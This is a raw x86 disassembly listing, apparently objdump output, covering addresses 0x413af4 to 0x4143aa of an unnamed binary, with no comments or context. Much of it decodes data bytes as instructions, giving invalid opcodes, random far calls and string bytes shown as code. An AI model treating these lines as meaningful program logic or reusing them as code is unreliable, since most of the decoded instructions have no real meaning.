  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	fnsave [edi+0x37]
  413baa:	inc    ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	hlt    
  413bf5:	add    DWORD PTR [ebx+0x0],eax
  413bf8:	pop    ecx
  413bf9:	dec    ecx
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    BYTE PTR [edx+0x12],ch
  413c46:	inc    ebx
  413c47:	add    BYTE PTR [eax],al
  413c49:	add    BYTE PTR [eax],al
  413c4b:	add    BYTE PTR [eax+eax*1+0x46],al
  413c4f:	add    BYTE PTR [ecx+0x0],ch
  413c52:	outs   dx,DWORD PTR ds:[esi]
  413c53:	add    BYTE PTR [edx+0x0],cl
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	das    
  413f01:	test   BYTE PTR [ecx+edi*8+0xd1dc],bl
  413f08:	add    al,0x1
  413f0a:	add    BYTE PTR [eax],al
  413f0c:	fst    DWORD PTR [esi-0x12]
  413f0f:	data16 in al,0x93
  413f12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f13:	dec    edi
  413f14:	jmp    0x3b530e87
  413f19:	and    cl,BYTE PTR [ebp-0x29]
  413f1c:	add    bl,BYTE PTR [edi+0x38]
  413f1f:	in     eax,dx
  413f20:	inc    ecx
  413f21:	lods   eax,DWORD PTR ds:[esi]
  413f22:	push   ss
  413f23:	ins    DWORD PTR es:[edi],dx
  413f24:	xchg   esp,eax
  413f25:	ss jge 0x413efc
  413f28:	lds    ebp,FWORD PTR [ebx+0x48605b65]
  413f2e:	sub    al,0x46
  413f30:	loop   0x413ecc
  413f32:	adc    DWORD PTR [eax],esi
  413f34:	pop    ecx
  413f35:	pop    ebp
  413f36:	aad    0xcb
  413f38:	or     dh,al
  413f3a:	mov    WORD PTR [eax+0x56],fs
  413f3d:	push   esp
  413f3e:	outs   dx,DWORD PTR ds:[esi]
  413f3f:	rol    BYTE PTR [edx+0x2ab9840c],1
  413f45:	aam    0x39
  413f47:	nop
  413f48:	mov    edi,DWORD PTR [ecx]
  413f4a:	sbb    ebp,edx
  413f4c:	push   eax
  413f4d:	xchg   ebp,eax
  413f4e:	lods   al,BYTE PTR ds:[esi]
  413f4f:	fdivr  DWORD PTR [edx+0x24c747c3]
  413f55:	jnp    0x413f51
  413f57:	or     al,dh
  413f59:	push   eax
  413f5a:	mov    al,0xcf
  413f5c:	jns    0x413f08
  413f5e:	into   
  413f5f:	das    
  413f60:	int3   
  413f61:	sub    ecx,edx
  413f63:	sub    DWORD PTR [ecx+0x2768c5b1],edi
  413f69:	inc    ecx
  413f6a:	out    0x37,al
  413f6c:	jns    0x413fd9
  413f6e:	mov    al,0x5e
  413f70:	int3   
  413f71:	cmp    DWORD PTR [ecx+edx*4],esi
  413f74:	mov    eax,cs
  413f76:	jge    0x413fd0
  413f78:	out    dx,eax
  413f79:	ret    
  413f7a:	cwde   
  413f7b:	inc    edx
  413f7c:	adc    al,BYTE PTR [ebp-0x6c68a5f9]
  413f82:	mov    BYTE PTR [ebp+0x3c],0xbf
  413f86:	repnz add al,0x66
  413f89:	scas   al,BYTE PTR es:[edi]
  413f8a:	cdq    
  413f8b:	shl    BYTE PTR [esi],0x76
  413f8e:	xor    DWORD PTR [edx+0x5e],ebp
  413f91:	push   ss
  413f92:	sti    
  413f93:	stos   DWORD PTR es:[edi],eax
  413f94:	adc    BYTE PTR [ebp+0x3e9afe39],dl
  413f9a:	in     eax,dx
  413f9b:	xor    eax,0x7b97d4a2
  413fa0:	outs   dx,DWORD PTR ds:[esi]
  413fa1:	add    esi,DWORD PTR [ebx+ecx*8-0x7bb757d7]
  413fa8:	sub    BYTE PTR [ebx-0x42ddf174],bl
  413fae:	icebp  
  413faf:	ins    DWORD PTR es:[edi],dx
  413fb0:	lea    edx,[eax]
  413fb2:	dec    esp
  413fb3:	dec    esp
  413fb4:	mov    bl,0x65
  413fb6:	clc    
  413fb7:	dec    ebx
  413fb8:	cs imul ebp,ebx,0x5
  413fbc:	adc    al,0x2
  413fbe:	mov    dl,0xca
  413fc0:	xchg   ebx,eax
  413fc1:	mov    ebp,0x6f8f834a
  413fc6:	(bad)  
  413fc7:	pop    ebx
  413fc8:	je     0x414039
  413fca:	jg     0x414034
  413fcc:	test   al,0x0
  413fce:	call   0x75d1:0x63ec9571
  413fd5:	xor    BYTE PTR [ebx+edx*1-0x71],cl
  413fd9:	ja     0x413fe4
  413fdb:	xor    al,0x82
  413fdd:	cmp    dh,BYTE PTR [esi]
  413fdf:	adc    BYTE PTR [eax],0x36
  413fe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fe3:	test   BYTE PTR [edi-0x7992248c],bl
  413fe9:	or     dl,al
  413feb:	dec    ebx
  413fec:	repz ss pop ebx
  413fef:	mov    ds:0xf950abbd,eax
  413ff4:	mov    dh,0x3b
  413ff6:	sbb    cl,BYTE PTR [esi-0x66afca89]
  413ffc:	inc    esp
  413ffd:	mov    ah,0xc2
  413fff:	test   al,0x6c
  414001:	pop    es
  414002:	dec    esp
  414003:	mov    ebx,0xc1713e8a
  414008:	pop    esp
  414009:	or     cl,BYTE PTR [edx-0x9f49c8a]
  41400f:	iret   
	...
  414074:	pop    edx
  414075:	ficom  DWORD PTR [esi+0x60]
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x4c5a:0xa5d52e96
  414083:	jp     0x414065
  414085:	rol    BYTE PTR [eax],cl
  414087:	add    BYTE PTR [ecx+eax*1],al
  41408a:	add    BYTE PTR [eax],al
  41408c:	jbe    0x41405d
  41408e:	adc    DWORD PTR [ecx+edi*2-0x2ad1f59e],ecx
  414095:	rcl    BYTE PTR cs:[eax-0xe82c543],cl
  41409c:	enter  0x532c,0x7b
  4140a0:	dec    esp
  4140a1:	call   0x5f965cc0
  4140a6:	mov    al,ds:0xc6617f09
  4140ab:	xor    dl,dl
  4140ad:	add    eax,0x5dd35fe4
  4140b2:	call   0x6d2a:0x18275797
  4140b9:	fsubr  DWORD PTR [edi]
  4140bb:	ins    BYTE PTR es:[edi],dx
  4140bc:	push   esi
  4140bd:	div    DWORD PTR [edi+0x632c5481]
  4140c3:	dec    ecx
  4140c4:	aad    0xe7
  4140c6:	out    0xf5,eax
  4140c8:	icebp  
  4140c9:	es inc esp
  4140cb:	fcmovne st,st(5)
  4140cd:	(bad)  
  4140ce:	loop   0x4140cf
  4140d0:	sub    eax,0xd08ba42
  4140d5:	retf   
  4140d6:	push   edx
  4140d7:	jl     0x414081
  4140d9:	sbb    eax,0xc5736c3c
  4140de:	cmc    
  4140df:	adc    DWORD PTR [ecx+0x29a23d64],0x73
  4140e6:	popf   
  4140e7:	(bad)  
  4140e9:	add    edi,ecx
  4140eb:	nop
  4140ec:	int    0xdd
  4140ee:	fld    QWORD PTR [ecx]
  4140f0:	arpl   WORD PTR [eax-0x734fc791],ax
  4140f6:	push   esp
  4140f7:	ror    edi,1
  4140f9:	out    0xbf,eax
  4140fb:	mov    eax,0xba7c5413
  414100:	in     eax,0xca
  414102:	mov    ch,0xa6
  414104:	es mov cl,0x41
  414108:	pop    DWORD PTR [ebx]
  41410a:	call   0xd011:0xcd021d48
  414111:	mov    eax,0x2319707b
  414116:	imul   esp,DWORD PTR [eax+edi*8-0xe],0x2a
  41411b:	fucom  st(7)
  41411d:	rol    DWORD PTR [edi-0xa],cl
  414120:	jge    0x4140f5
  414122:	inc    edx
  414123:	adc    BYTE PTR [edx+0x5b],cl
  414126:	mov    edi,0xc805ef98
  41412b:	push   es
  41412c:	pop    es
  41412d:	push   ecx
  41412e:	je     0x4141af
  414130:	sub    dh,BYTE PTR [edi]
  414132:	jns    0x4140f3
  414134:	lds    esi,FWORD PTR [esp+ebx*4-0x33]
  414138:	add    al,0xc6
  41413a:	mov    ds,WORD PTR [eax-0x3c]
  41413d:	cmp    esi,DWORD PTR [eax-0x1b94da07]
  414143:	fdiv   DWORD PTR [ecx-0x47]
  414146:	adc    ecx,DWORD PTR [edi+0x6ca9e440]
  41414c:	adc    dl,BYTE PTR [ebx-0xb0cea3a]
  414152:	call   0x8353cd08
  414157:	mov    edx,0x58a1ade0
  41415c:	lods   eax,DWORD PTR ds:[esi]
  41415d:	dec    esp
  41415e:	cmova  esi,ecx
  414161:	pop    es
  414162:	mov    eax,0x440fd3b6
  414167:	xor    BYTE PTR [edx+esi*1+0x9],bh
  41416b:	mov    eax,ds:0x69427cc3
  414170:	lods   al,BYTE PTR ds:[esi]
  414171:	pop    ebx
  414172:	or     eax,eax
  414174:	ds dec ecx
  414176:	and    esi,edi
  414178:	sub    eax,0xebd63582
  41417d:	std    
  41417e:	mov    al,0x4a
  414180:	scas   eax,DWORD PTR es:[edi]
  414181:	pop    esi
  414182:	lods   eax,DWORD PTR ds:[esi]
  414183:	xor    DWORD PTR [ebx-0x38],esi
  414186:	push   ds
  414187:	imul   esi,ecx,0x588866b7
  41418d:	es jl  0x41413a
	...
  4141f4:	add    dl,BYTE PTR [edx]
  4141f6:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	daa    
  414201:	sub    al,0x77
  414203:	push   esp
  414204:	in     al,0xd3
  414206:	add    BYTE PTR [eax],al
  414208:	add    al,0x1
  41420a:	add    BYTE PTR [eax],al
  41420c:	repnz inc edx
  41420e:	pop    ds
  41420f:	or     al,0xaa
  414211:	test   al,0xca
  414213:	push   ecx
  414214:	push   esp
  414215:	call   0xf98e1ba3
  41421a:	push   0x6b
  41421c:	ror    BYTE PTR [esp+ebp*1+0x41],cl
  414220:	cwde   
  414221:	pushf  
  414222:	shr    BYTE PTR [esi],0x9f
  414225:	fbstp  TBYTE PTR es:[ecx+edx*1+0x63d793ae]
  41422d:	push   ecx
  41422e:	xor    DWORD PTR [ecx],ecx
  414230:	hlt    
  414231:	cmp    bl,BYTE PTR [edi]
  414233:	scas   al,BYTE PTR es:[edi]
  414234:	pop    eax
  414235:	ret    
  414236:	outs   dx,DWORD PTR ds:[esi]
  414237:	sbb    edx,0xf98c7149
  41423d:	add    DWORD PTR [ebx+0x77f2674d],0x5e
  414244:	into   
  414245:	loopne 0x414252
  414247:	cs hlt 
  414249:	xchg   ebx,eax
  41424a:	(bad)  
  41424b:	js     0x4142a3
  41424d:	test   eax,0x6c06bad
  414252:	mov    edx,0x5185d7cd
  414257:	pop    ebp
  414258:	xor    DWORD PTR [ebp+0x29],eax
  41425b:	dec    esi
  41425c:	and    eax,0x7cfef9df
  414261:	push   ds
  414262:	fst    QWORD PTR [ecx+0x0]
  414265:	retf   0x4e38
  414268:	sbb    al,0xab
  41426a:	sub    DWORD PTR [esp+eiz*2],edx
  41426d:	jo     0x4142ab
  41426f:	dec    esp
  414270:	mov    edx,0x469d16c9
  414275:	inc    edi
  414276:	and    ecx,0x36
  414279:	or     DWORD PTR [ecx+0x72],esp
  41427c:	adc    al,0x62
  41427e:	adc    eax,0xba2291a
  414283:	fmul   DWORD PTR [edi+eax*2]
  414286:	add    eax,0x1578819b
  41428b:	(bad)  
  41428c:	dec    esp
  41428d:	mov    dl,0x6c
  41428f:	popa   
  414290:	(bad)  
  414291:	push   eax
  414292:	pop    eax
  414293:	scas   al,BYTE PTR es:[edi]
  414294:	(bad)  
  414295:	in     eax,0x99
  414297:	aas    
  414298:	ins    DWORD PTR es:[edi],dx
  414299:	xchg   edi,eax
  41429a:	outs   dx,BYTE PTR ds:[esi]
  41429b:	loope  0x41423b
  41429d:	sub    al,0x26
  41429f:	pop    ebx
  4142a0:	jmp    0x2917:0x8facf843
  4142a7:	bound  eax,QWORD PTR [edx]
  4142a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142aa:	push   esp
  4142ab:	push   ebx
  4142ac:	rcr    DWORD PTR [ebx+0x159cf537],1
  4142b2:	cmp    DWORD PTR [ebp-0x292ff97b],0x58e079e8
  4142bc:	sub    esi,DWORD PTR [edx+esi*4+0x24]
  4142c0:	jns    0x414311
  4142c2:	mov    gs,esp
  4142c4:	lods   al,BYTE PTR ds:[esi]
  4142c5:	(bad)  
  4142c6:	in     eax,dx
  4142c7:	int3   
  4142c8:	push   ds
  4142c9:	cdq    
  4142ca:	jo     0x4142b1
  4142cc:	push   eax
  4142cd:	(bad)  
  4142ce:	aad    0x25
  4142d0:	je     0x41425e
  4142d2:	dec    edi
  4142d3:	adc    al,0x2d
  4142d5:	outs   dx,DWORD PTR ds:[esi]
  4142d6:	aas    
  4142d7:	mov    ch,0x8c
  4142d9:	mov    bl,0xe8
  4142db:	fst    DWORD PTR [edi-0x66]
  4142de:	jmp    0x414268
  4142e0:	lods   eax,DWORD PTR ds:[esi]
  4142e1:	sar    DWORD PTR [ebx],0xb0
  4142e4:	inc    esi
  4142e5:	pop    esp
  4142e6:	sub    DWORD PTR [ecx+0x23],0x5540d2f3
  4142ed:	inc    edx
  4142ee:	retf   
  4142ef:	mov    ecx,0x314f6c9e
  4142f4:	and    DWORD PTR [ecx+eiz*8-0x930f3a2],0xb3d11383
  4142ff:	jae    0x414312
  414301:	xchg   edx,eax
  414302:	ret    
  414303:	push   0xa2bdde05
  414308:	mov    al,ds:0x1c10fc54
  41430d:	(bad)  
  41430e:	aad    0x3b
	...
  414374:	add    DWORD PTR [ecx-0x2122293],eax
  41437a:	mov    cl,0xdd
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	jl     0x414394
  414382:	data16 mov al,ch
  414385:	aam    0x0
  414387:	add    BYTE PTR [ecx+eax*1],al
  41438a:	add    BYTE PTR [eax],al
  41438c:	repz push esi
  41438e:	fwait
  41438f:	add    al,0x51
  414391:	xor    esi,esp
  414393:	or     BYTE PTR ds:0xf2b69379,ah
  414399:	mov    eax,0x9434efbd
  41439e:	or     DWORD PTR [ebx+eiz*1],esi
  4143a1:	out    dx,al
  4143a2:	aaa    
  4143a3:	aas    
  4143a4:	inc    esi
  4143a5:	mov    ecx,0xd7f355b
  4143aa:	sbb    al,0x87
